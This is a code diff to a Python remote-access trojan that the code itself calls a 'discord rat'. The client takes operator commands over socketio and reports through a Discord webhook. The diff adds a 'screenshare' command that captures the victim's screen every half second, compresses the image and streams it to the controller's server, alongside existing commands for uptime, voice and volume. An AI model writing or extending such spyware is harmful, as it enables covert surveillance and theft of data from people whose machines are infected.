@@ -17,6 +17,7 @@ from dhooks import Webhook as web
 from dhooks import Embed, File
 from PIL import ImageGrab
 from pynput.keyboard import Key, Controller
+import threading
 sio = socketio.Client()
 
 
@@ -126,7 +127,63 @@ class CommandHandler():
         embed.add_field(name="Uptime :",value=datetime.now())
         embed.set_footer(text=cc.get_footer(), icon_url=cc.get_avatar())
 
-        self.webhook.send(embed=embed)            
+        self.webhook.send(embed=embed)   
+        
+    def screenshare(self):
+        def to_execute(self):
+            import eventlet
+            import socketio
+            from threading import Thread
+            from zlib import compress
+            import time
+
+            from mss import mss
+
+            _sio = socketio.Client()
+
+            WIDTH = 1900
+            HEIGHT = 1000
+
+            @_sio.event
+            def connect():
+                while True:
+                    with mss() as sct:
+                        # The region to capture
+                        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}
+
+                        while True:
+                            # Capture the screen
+                            img = sct.grab(rect)
+                            # Tweak the compression level here (0-9)
+                            pixels = compress(img.rgb, 6)
+
+                            # Send the size of the pixels length
+                            size = len(pixels)
+                            size_len = (size.bit_length() + 7) // 8
+                            final_size_len = bytes([size_len])
+                            #conn.send(bytes([size_len]))
+
+                            # Send the actual pixels length
+                            size_bytes = size.to_bytes(size_len, 'big')
+                            final_size_bytes = size_bytes
+                            #conn.send(size_bytes)
+
+                            # Send pixels
+                            #conn.sendall(pixels)
+                            
+                            _sio.emit('sending_screenshot', {'data': {
+                                'size_len': final_size_len,
+                                'size_bytes': final_size_bytes, 
+                                'pixels': pixels
+                            }})
+                            time.sleep(0.5) #Don't overload the server
+                            
+            _sio.connect(cc.get_discord_rat_link())
+            
+        t = threading.Thread(target=to_execute, args=(self,))
+        t.run()
+            
+                        
 cmdhandler = CommandHandler()
 
 @sio.event
@@ -154,6 +211,9 @@ def receive_command(data):
 
     if data['data'].startswith('voice') is True:
         cmdhandler.voice(data['data'].split('voice', 1)[1])
+        
+    if data['data'] == 'screenshare':
+        cmdhandler.screenshare()
 
     if data['data'] == 'volumemax':
         cmdhandler.volumeup()
@@ -169,6 +229,7 @@ def receive_command(data):
 
     if data["data"] == "uptime":
         cmdhandler.uptime()
+        
 
 
 @sio.event
